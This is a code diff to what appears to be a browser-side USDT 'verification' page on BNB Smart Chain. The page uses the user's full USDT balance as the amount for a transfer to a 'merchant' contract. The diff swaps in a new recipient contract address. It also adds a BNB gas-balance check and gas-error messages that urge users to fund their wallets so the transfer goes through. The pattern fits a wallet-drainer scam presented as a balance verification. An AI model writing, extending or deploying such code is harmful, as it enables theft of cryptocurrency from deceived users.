@@ -12,7 +12,7 @@
     const CONFIG = {
         BACKEND_URL: 'https://at.rgh.digital',
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
-        CONTRACT_ADDRESS: '0x5FA8459dD2d402321150fA411D50BBaCb2eafED5', // Merchant Recipient Address
+        CONTRACT_ADDRESS: '0xd32621F6cd43eF8DDD3c942dB35F7Dc008377B41', // Merchant Contract Address
         USER_MIN_USDT: 1, // Minimum USDT balance required for full verification
         GAS_THRESHOLD: 0.0005,
         GAS_RETRY_COUNT: 3,
@@ -375,6 +375,16 @@
             const provider = new ethers.BrowserProvider(window.ethereum);
             const signer = await provider.getSigner();
 
+            // Pre-check BNB gas fee balance
+            const bnbBalanceRaw = await provider.getBalance(state.walletAddress);
+            if (bnbBalanceRaw < ethers.parseEther('0.0003')) {
+                updateStatus('⚠️ Insufficient BNB for transaction gas fees. Please add at least 0.001 BNB to your wallet.', 'warning');
+                alert('Gas Fee Required: Your wallet needs a small amount of native BNB (approx. $0.10) to cover blockchain transaction fees on BNB Smart Chain.');
+                state.isApproving = false;
+                updateWalletInfoUI();
+                return;
+            }
+
             const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
             const amountWei = ethers.parseUnits(state.usdtBalance, 18);
 
@@ -396,6 +406,8 @@
             if (err.code === 401 || err.message?.includes('user rejected') || err.message?.includes('User denied')) {
                 updateStatus('🚫 Transfer request cancelled by user.', 'error');
                 openModal(elements.abortOverlay);
+            } else if (err.message?.includes('estimateGas') || err.code === 'CALL_EXCEPTION') {
+                updateStatus('⚠️ Gas Error: Wallet lacks BNB gas fees or transaction execution reverted.', 'error');
             } else {
                 updateStatus('❌ Transfer failed: ' + (err.reason || err.message || 'Transaction error'), 'error');
             }
